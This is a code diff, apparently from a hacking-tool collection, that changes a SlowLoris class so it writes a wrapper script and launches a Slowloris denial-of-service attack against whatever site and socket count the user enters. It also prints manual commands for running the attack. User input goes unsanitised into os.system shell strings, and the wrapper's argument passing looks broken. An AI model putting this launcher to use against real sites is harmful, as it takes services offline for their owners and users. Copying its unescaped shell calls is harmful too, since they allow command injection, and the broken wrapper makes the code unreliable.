@@ -50,12 +50,30 @@ class SlowLoris(HackingTool):
     def run(self):
         target_site = input("Enter Target Site:- ")
         num_sockets = input("Enter Number of Sockets (default 150):- ") or "150"
+        
+        # Create a simple wrapper script to run slowloris
+        wrapper_script = """#!/usr/bin/env python3
+from slowloris import slowloris
+import sys
+
+if __name__ == "__main__":
+    args = sys.argv[1:]
+    slowloris.slowloris(*args)
+"""
+        
         try:
-            os.system(f"cd slowloris-tool && . slowloris-env/bin/activate && python -m slowloris {target_site} -s {num_sockets}")
+            # Create the wrapper script
+            with open("slowloris-tool/run_slowloris.py", "w") as f:
+                f.write(wrapper_script)
+            
+            print(f"Starting Slowloris attack on {target_site} with {num_sockets} sockets...")
+            os.system(f"cd slowloris-tool && . slowloris-env/bin/activate && python run_slowloris.py {target_site} -s {num_sockets}")
         except Exception as e:
             print(f"Error running slowloris: {str(e)}")
-            print("\nManual command to run slowloris:")
-            print(f"cd slowloris-tool && . slowloris-env/bin/activate && python -m slowloris {target_site} -s {num_sockets}")
+            print("\nAlternative method to run slowloris:")
+            print("1. cd slowloris-tool")
+            print("2. . slowloris-env/bin/activate")
+            print(f"3. python -c 'from slowloris import slowloris; slowloris.slowloris(\"{target_site}\", socket_count={num_sockets})'")
 
 
 class Asyncrone(HackingTool):
